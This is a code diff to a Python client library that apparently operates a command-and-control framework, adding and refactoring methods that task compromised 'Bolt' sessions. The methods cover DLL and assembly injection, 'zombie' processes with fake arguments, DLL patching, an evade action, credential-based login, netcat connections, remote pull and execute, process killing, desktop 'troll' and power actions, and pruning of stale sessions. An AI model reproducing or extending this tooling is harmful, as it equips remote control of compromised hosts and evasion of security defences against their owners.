             f"script/{name}/download", 201, "put", json=_pkg_download(target, line)
         )
 
-    def script_troll(self, name, line, action, arg1=None):
+    def script_upload(self, name, line, data, dest):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
         if not nes(line):
             raise ValueError('"line" must be a non-empty string')
         return self._req(
-            f"script/{name}/ui", 201, "put", json=_pkg_troll(action, arg1, line)
+            f"script/{name}/upload",
+            201,
+            "put",
+            json=_pkg_upload(data, dest, line),
         )
 
     def script_system(self, name, line, cmd, filter=None):
@@ -1102,22 +1331,13 @@ class Api(object):
             f"script/{name}/io", 201, "put", json=_pkg_delete(path, force, line)
         )
 
-    def script_wallpaper(self, name, line, file, raw=None):
+    def script_kill(self, name, line, pid=None, pname=None):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
         if not nes(line):
             raise ValueError('"line" must be a non-empty string')
         return self._req(
-            f"script/{name}/ui", 201, "put", json=_pkg_wallpaper(file, raw, line)
-        )
-
-    def script_kill(self, name, line, pid=None, proc=None):
-        if not nes(name):
-            raise ValueError('"name" must be a non-empty string')
-        if not nes(line):
-            raise ValueError('"line" must be a non-empty string')
-        return self._req(
-            f"script/{name}/io", 201, "put", json=_pkg_kill(pid, proc, line)
+            f"script/{name}/io", 201, "put", json=_pkg_kill(pid, pname, line)
         )
 
     def script_pull(self, name, line, url, dest, agent=None):
@@ -1129,25 +1349,76 @@ class Api(object):
             f"script/{name}/pull", 201, "put", json=_pkg_pull(url, dest, agent, line)
         )
 
-    def script_login(self, name, line, user, domain="", pw=""):
+    def script_workhours(self, name, line, days="", start="", end=""):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
         if not nes(line):
             raise ValueError('"line" must be a non-empty string')
         return self._req(
-            f"script/{name}/login", 201, "put", json=_pkg_login(user, domain, pw, line)
-        )
-
-    def script_upload(self, name, line, target, dest, raw=None):
-        if not nes(name):
-            raise ValueError('"name" must be a non-empty string')
-        if not nes(line):
-            raise ValueError('"line" must be a non-empty string')
-        return self._req(
-            f"script/{name}/upload",
+            f"script/{name}/sys/workhours",
             201,
             "put",
-            json=_pkg_upload(target, dest, raw, line),
+            json=_pkg_workhours(days, start, end, line),
+        )
+
+    def script_troll(self, name, line, action, enable=False, seconds=None):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/ui",
+            201,
+            "put",
+            json=_pkg_troll(action, enable, seconds, line),
+        )
+
+    def script_check(self, name, line, dll, function="", data=None, raw=False):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/dll/check",
+            201,
+            "put",
+            json=_pkg_check_patch(dll, function, data, raw, line),
+        )
+
+    def script_patch(self, name, line, dll, function="", data=None, raw=False):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/dll/patch",
+            201,
+            "put",
+            json=_pkg_check_patch(dll, function, data, raw, line),
+        )
+
+    def script_login(self, name, line, user, domain="", pw="", interactive=False):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/login",
+            201,
+            "put",
+            json=_pkg_login(user, domain, pw, interactive, line),
+        )
+
+    def script_funcmap(self, name, line, action, function="", data=None, raw=False):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/funcmap",
+            201,
+            "put",
+            json=_pkg_funcmap(action, function, data, raw, line),
         )
 
     def script_add(
@@ -1166,12 +1437,12 @@ class Api(object):
         self,
         name,
         line,
-        file,
-        raw=None,
+        data,
         reflect=True,
         show=False,
         detach=False,
         filter=None,
+        entry=None,
     ):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
@@ -1181,7 +1452,51 @@ class Api(object):
             f"script/{name}/dll",
             201,
             "put",
-            json=_pkg_dll(file, raw, reflect, show, detach, filter, line),
+            json=_pkg_dll(data, reflect, show, detach, filter, entry, line),
+        )
+
+    def script_wts(
+        self,
+        name,
+        line,
+        action,
+        session=None,
+        title="",
+        text="",
+        flags=None,
+        seconds=None,
+        wait=False,
+    ):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/wts",
+            201,
+            "put",
+            json=_pkg_wts(action, session, title, text, flags, seconds, wait, line),
+        )
+
+    def script_power(
+        self,
+        name,
+        line,
+        action,
+        message="",
+        force=False,
+        seconds=None,
+        reason=None,
+    ):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/power",
+            201,
+            "put",
+            json=_pkg_power(action, message, force, seconds, reason, line),
         )
 
     def script_spawn(
@@ -1206,6 +1521,27 @@ class Api(object):
             json=_pkg_spawn(pipe, method, profile, exec, show, filter, line),
         )
 
+    def script_netcat(
+        self,
+        name,
+        line,
+        host,
+        proto=None,
+        seconds=None,
+        data=None,
+        read=False,
+    ):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/net",
+            201,
+            "put",
+            json=_pkg_netcat(host, proto, seconds, data, read, line),
+        )
+
     def script_update(
         self,
         name,
@@ -1222,15 +1558,15 @@ class Api(object):
         self,
         name,
         line,
-        file,
+        data,
         fake_args,
-        raw=None,
         show=False,
         detach=False,
         filter=None,
         user="",
         domain="",
         pw="",
+        entry=None,
     ):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
@@ -1241,7 +1577,7 @@ class Api(object):
             201,
             "put",
             json=_pkg_zombie(
-                file, fake_args, raw, show, detach, filter, user, domain, pw, line
+                data, fake_args, show, detach, filter, user, domain, pw, line, entry
             ),
         )
 
@@ -1251,10 +1587,15 @@ class Api(object):
         line,
         action,
         handle=None,
-        arg1=None,
-        arg2=None,
-        arg3=None,
-        arg4=None,
+        state=None,
+        opacity=None,
+        pos_x=None,
+        pos_y=None,
+        width=None,
+        height=None,
+        title="",
+        text="",
+        flags=None,
     ):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
@@ -1264,7 +1605,20 @@ class Api(object):
             f"script/{name}/ui",
             201,
             "put",
-            json=_pkg_window(action, handle, arg1, arg2, arg3, arg4, line),
+            json=_pkg_window(
+                action,
+                handle,
+                state,
+                opacity,
+                pos_x,
+                pos_y,
+                width,
+                height,
+                title,
+                text,
+                flags,
+                line,
+            ),
         )
 
     def script_execute(
@@ -1340,11 +1694,11 @@ class Api(object):
         self,
         name,
         line,
-        file,
-        raw=None,
+        data,
         show=False,
         detach=False,
         filter=None,
+        entry=None,
     ):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
@@ -1354,7 +1708,7 @@ class Api(object):
             f"script/{name}/asm",
             201,
             "put",
-            json=_pkg_assembly(file, raw, show, detach, filter, line),
+            json=_pkg_assembly(data, show, detach, filter, entry, line),
         )
 
     def script_pull_exec(
@@ -1456,43 +1810,6 @@ class Api(object):
             raise ValueError('"id" must be a non-empty string')
         return self._req(f"session/{id}", 200, "get")
 
-    def session_prune(self, duration):
-        # NOTE(dij): Should this be in this section?
-        #            or does it make more sense in doppler?
-        #            Since it's more interactive than API-ish.
-        if nes(duration) and duration[-1] not in Utils.UNITS:
-            duration += "m"  # Make it default to mins.
-        v = Utils.str_to_dur(duration) / 1000000000
-        r = list()
-        n = datetime.now()
-        for i in self.sessions():
-            x = n - datetime.fromisoformat(i["last"].replace("Z", "")).replace(
-                tzinfo=None
-            )
-            if x.total_seconds() > v:
-                r.append((i["id"], i["last"]))
-            del x
-        del v
-        if len(r) == 0:
-            del r
-            print("[-] There were no Bolts matching the prune limit.")
-            return False
-        print(f'{"ID":9}Last\n{"="*20}')
-        for i in r:
-            print(f"{i[0]:9}{time_str(n, i[1], True)}")
-        print()
-        del n
-        if not do_ask(f"Prune {len(r)} Bolts"):
-            del r
-            print("[-] Aborting prune!")
-            return False
-        for i in r:
-            self.session_remove(i[0])
-            print(f"[+] Removed Bolt {i[0]}")
-        print(f"[+] Removed {len(r)} Bolts")
-        del r
-        return True
-
     def session_proxy_remove(self, id, name):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
@@ -1553,6 +1870,53 @@ class Api(object):
                 f'"{self._base}/session/{id}/proxy/{name}" returned an invalid result'
             )
         return int(r["id"])
+
+    def session_prune(
+        self, duration=None, force=True, errors=False, verbose=False, work_hours=True
+    ):
+        if duration is None or (isinstance(duration, str) and len(duration) == 0):
+            duration = "1m"
+        elif not isinstance(duration, (str, int)):
+            raise ValueError('invalid "duration" value')
+        elif nes(duration) and duration[-1] not in Utils.UNITS:
+            duration += "m"  # Make it default to mins.
+        v = Utils.str_to_dur(duration) / 1000000000
+        r = list()
+        n = datetime.now()
+        for i in self.sessions():
+            x = n - datetime.fromisoformat(i["last"].replace("Z", "")).replace(
+                tzinfo=None
+            )
+            if x.total_seconds() > v:
+                if work_hours and "work_hours" in i and len(i["work_hours"]) > 0:
+                    continue
+                r.append((i["id"], i["last"]))
+            del x
+        del v
+        if len(r) == 0:
+            del r
+            if errors:
+                raise ValueError("There were no Bolts matching the prune limit")
+            return False
+        if verbose:
+            print(f'{"ID":9}Last\n{"="*20}')
+            for i in r:
+                print(f"{i[0]:9}{time_str(n, i[1], True)}")
+            print()
+        del n
+        if force or not do_ask(f"Prune {len(r)} Bolts", True):
+            del r
+            if errors:
+                raise ValueError("Aborting prune!")
+            return False
+        for i in r:
+            self.session_remove(i[0])
+            if verbose:
+                print(f"[+] Removed Bolt {i[0]}")
+        if verbose:
+            print(f"[+] Removed {len(r)} Bolts")
+        del r
+        return True
 
     def listeners(self):
         r = self._req("listener", 200, "get")
@@ -1619,6 +1983,16 @@ class Api(object):
             )
         return int(r["id"])
 
+    def task_evade(self, id, action):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(f"session/{id}/evade", 201, "put", json=_pkg_evade(action))
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/evade" returned an invalid result'
+            )
+        return int(r["id"])
+
     def task_script(self, id, script):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
@@ -1649,6 +2023,16 @@ class Api(object):
             )
         return int(r["id"])
 
+    def task_wallpaper(self, id, data):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(f"session/{id}/ui", 201, "put", json=_pkg_wallpaper(data))
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/ui" returned an invalid result'
+            )
+        return int(r["id"])
+
     def task_profile(self, id, profile):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
@@ -1669,13 +2053,13 @@ class Api(object):
             )
         return int(r["id"])
 
-    def task_troll(self, id, action, arg1=None):
+    def task_upload(self, id, data, dest):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
-        r = self._req(f"session/{id}/ui", 201, "put", json=_pkg_troll(action, arg1))
+        r = self._req(f"session/{id}/upload", 201, "put", json=_pkg_upload(data, dest))
         if not isinstance(r, dict) or "id" not in r:
             raise ValueError(
-                f'"{self._base}/session/{id}/ui" returned an invalid result'
+                f'"{self._base}/session/{id}/upload" returned an invalid result'
             )
         return int(r["id"])
 
@@ -1703,23 +2087,13 @@ class Api(object):
             )
         return int(r["id"])
 
-    def task_kill(self, id, pid=None, proc=None):
+    def task_kill(self, id, pid=None, pname=None):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
-        r = self._req(f"session/{id}/io", 201, "put", json=_pkg_kill(pid, proc))
+        r = self._req(f"session/{id}/io", 201, "put", json=_pkg_kill(pid, pname))
         if not isinstance(r, dict) or "id" not in r:
             raise ValueError(
                 f'"{self._base}/session/{id}/io" returned an invalid result'
-            )
-        return int(r["id"])
-
-    def task_wallpaper(self, id, file, raw=None):
-        if not nes(id):
-            raise ValueError('"id" must be a non-empty string')
-        r = self._req(f"session/{id}/ui", 201, "put", json=_pkg_wallpaper(file, raw))
-        if not isinstance(r, dict) or "id" not in r:
-            raise ValueError(
-                f'"{self._base}/session/{id}/ui" returned an invalid result'
             )
         return int(r["id"])
 
@@ -1735,11 +2109,71 @@ class Api(object):
             )
         return int(r["id"])
 
-    def task_login(self, id, user, domain="", pw=""):
+    def task_workhours(self, id, days="", start="", end=""):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
         r = self._req(
-            f"session/{id}/login", 201, "put", json=_pkg_login(user, domain, pw)
+            f"session/{id}/sys/workhours",
+            201,
+            "put",
+            json=_pkg_workhours(days, start, end),
+        )
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/sys/workhours" returned an invalid result'
+            )
+        return int(r["id"])
+
+    def task_troll(self, id, action, enable=False, seconds=None):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(
+            f"session/{id}/ui", 201, "put", json=_pkg_troll(action, enable, seconds)
+        )
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/ui" returned an invalid result'
+            )
+        return int(r["id"])
+
+    def task_check(self, id, dll, function="", data=None, raw=False):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(
+            f"session/{id}/dll/check",
+            201,
+            "put",
+            json=_pkg_check_patch(dll, function, data, raw),
+        )
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/dll/check" returned an invalid result'
+            )
+        return int(r["id"])
+
+    def task_patch(self, id, dll, function="", data=None, raw=False):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(
+            f"session/{id}/dll/patch",
+            201,
+            "put",
+            json=_pkg_check_patch(dll, function, data, raw),
+        )
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/dll/patch" returned an invalid result'
+            )
+        return int(r["id"])
+
+    def task_login(self, id, user, domain="", pw="", interactive=False):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(
+            f"session/{id}/login",
+            201,
+            "put",
+            json=_pkg_login(user, domain, pw, interactive),
         )
         if not isinstance(r, dict) or "id" not in r:
             raise ValueError(
@@ -1747,42 +2181,45 @@ class Api(object):
             )
         return int(r["id"])
 
-    def task_upload(self, id, target, dest, raw=None):
+    def task_funcmap(self, id, action, function="", data=None, raw=False):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
         r = self._req(
-            f"session/{id}/upload", 201, "put", json=_pkg_upload(target, dest, raw)
+            f"session/{id}/funcmap",
+            201,
+            "put",
+            json=_pkg_funcmap(action, function, data, raw),
         )
         if not isinstance(r, dict) or "id" not in r:
             raise ValueError(
-                f'"{self._base}/session/{id}/upload" returned an invalid result'
+                f'"{self._base}/session/{id}/funcmap" returned an invalid result'
             )
         return int(r["id"])
 
-    def task_assembly(self, id, file, raw=None, show=False, detach=False, filter=None):
+    def task_netcat(self, id, host, proto=None, seconds=None, data=None, read=False):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
         r = self._req(
-            f"session/{id}/asm",
+            f"session/{id}/net",
             201,
             "put",
-            json=_pkg_assembly(file, raw, show, detach, filter),
+            json=_pkg_netcat(host, proto, seconds, data, read),
         )
         if not isinstance(r, dict) or "id" not in r:
             raise ValueError(
-                f'"{self._base}/session/{id}/asm" returned an invalid result'
+                f'"{self._base}/session/{id}/net" returned an invalid result'
             )
         return int(r["id"])
 
     def task_dll(
         self,
         id,
-        file,
-        raw=None,
+        data,
         reflect=True,
         show=False,
         detach=False,
         filter=None,
+        entry=None,
     ):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
@@ -1790,11 +2227,59 @@ class Api(object):
             f"session/{id}/dll",
             201,
             "put",
-            json=_pkg_dll(file, raw, reflect, show, detach, filter),
+            json=_pkg_dll(data, reflect, show, detach, filter, entry),
         )
         if not isinstance(r, dict) or "id" not in r:
             raise ValueError(
                 f'"{self._base}/session/{id}/dll" returned an invalid result'
+            )
+        return int(r["id"])
+
+    def task_wts(
+        self,
+        id,
+        action,
+        session=None,
+        title="",
+        text="",
+        flags=None,
+        seconds=None,
+        wait=False,
+    ):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(
+            f"session/{id}/wts",
+            201,
+            "put",
+            json=_pkg_wts(action, session, title, text, flags, seconds, wait),
+        )
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/wts" returned an invalid result'
+            )
+        return int(r["id"])
+
+    def task_power(
+        self,
+        id,
+        action,
+        message="",
+        force=False,
+        seconds=None,
+        reason=None,
+    ):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(
+            f"session/{id}/power",
+            201,
+            "put",
+            json=_pkg_power(action, message, force, seconds, reason),
+        )
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/power" returned an invalid result'
             )
         return int(r["id"])
 
@@ -1825,15 +2310,15 @@ class Api(object):
     def task_zombie(
         self,
         id,
-        file,
+        data,
         fake_args,
-        raw=None,
         show=False,
         detach=False,
         filter=None,
         user="",
         domain="",
         pw="",
+        entry=None,
     ):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
@@ -1842,7 +2327,7 @@ class Api(object):
             201,
             "put",
             json=_pkg_zombie(
-                file, fake_args, raw, show, detach, filter, user, domain, pw
+                data, fake_args, show, detach, filter, user, domain, pw, entry
             ),
         )
         if not isinstance(r, dict) or "id" not in r:
@@ -1856,10 +2341,15 @@ class Api(object):
         id,
         action,
         handle=None,
-        arg1=None,
-        arg2=None,
-        arg3=None,
-        arg4=None,
+        state=None,
+        opacity=None,
+        pos_x=None,
+        pos_y=None,
+        width=None,
+        height=None,
+        title="",
+        text="",
+        flags=None,
     ):
         if not nes(id):
             raise ValueError('"id" must be a non-empty string')
@@ -1867,7 +2357,19 @@ class Api(object):
             f"session/{id}/ui",
             201,
             "put",
-            json=_pkg_window(action, handle, arg1, arg2, arg3, arg4),
+            json=_pkg_window(
+                action,
+                handle,
+                state,
+                opacity,
+                pos_x,
+                pos_y,
+                width,
+                height,
+                title,
+                text,
+                flags,
+            ),
         )
         if not isinstance(r, dict) or "id" not in r:
             raise ValueError(
@@ -1947,6 +2449,29 @@ class Api(object):
         if not isinstance(r, dict) or "id" not in r:
             raise ValueError(
                 f'"{self._base}/session/{id}/regedit" returned an invalid result'
+            )
+        return int(r["id"])
+
+    def task_assembly(
+        self,
+        id,
+        data,
+        show=False,
+        detach=False,
+        filter=None,
+        entry=None,
+    ):
+        if not nes(id):
+            raise ValueError('"id" must be a non-empty string')
+        r = self._req(
+            f"session/{id}/asm",
+            201,
+            "put",
+            json=_pkg_assembly(data, show, detach, filter, entry),
+        )
+        if not isinstance(r, dict) or "id" not in r:
+            raise ValueError(
+                f'"{self._base}/session/{id}/asm" returned an invalid result'
             )
         return int(r["id"])
 
@@ -2044,6 +2569,8 @@ class Filter(object):
 class _Events(Thread):
     __slots__ = ("_sock", "_handle", "_running", "_select")
 
+    abort = 0
+
     def __init__(self, sock):
         Thread.__init__(self)
         self._sock = sock
@@ -2062,35 +2589,56 @@ class _Events(Thread):
             )
         except Exception as err:
             print(f"[!] Socket error: {err}!")
-        self._sock = None
-        if self._running.is_set():
-            print("[-] Socket closed.")
 
     def close(self):
+        if self._running.is_set():
+            return
         self._running.set()
         if self._sock is None:
             return
+        self._select.register(stderr, 3)
         try:
-            self._select.modify(self._handle, EVENT_WRITE)
-            self._select.close()
-            self._sock.sock.close()
-            # NOTE(dij): Causes a slow quit
-            self._sock.close()
-        except (ValueError, AttributeError):
+            if self._handle is not None:
+                try:
+                    self._handle.close()
+                except Exception:
+                    pass
+        except AttributeError:
             pass
+        try:
+            self._select.close()
+        except Exception:
+            pass
+        # print("[-] Closing socket..")
+        try:
+            if self._sock.sock:
+                self._sock.sock.shutdown()
+                self._sock.sock.close(timeout=1)
+            else:
+                self._sock.close(timeout=1)
+        except Exception as err:
+            print(err)
 
     def read(self, s, f):
         self._handle = s
         try:
-            self._select.register(s, EVENT_READ)
+            self._select.register(s, 1)
             while self._select.select(None):
                 if self._running.is_set():
                     return
                 f()
         finally:
             self._handle = None
-            self._select.close()
+            try:
+                self._select.close()
+            except Exception:
+                pass
             del self._select, self._handle
+
+    def signal(self, a, _):
+        if a == 2:
+            return
+        self.close()
 
 
 class CirrusError(ValueError):
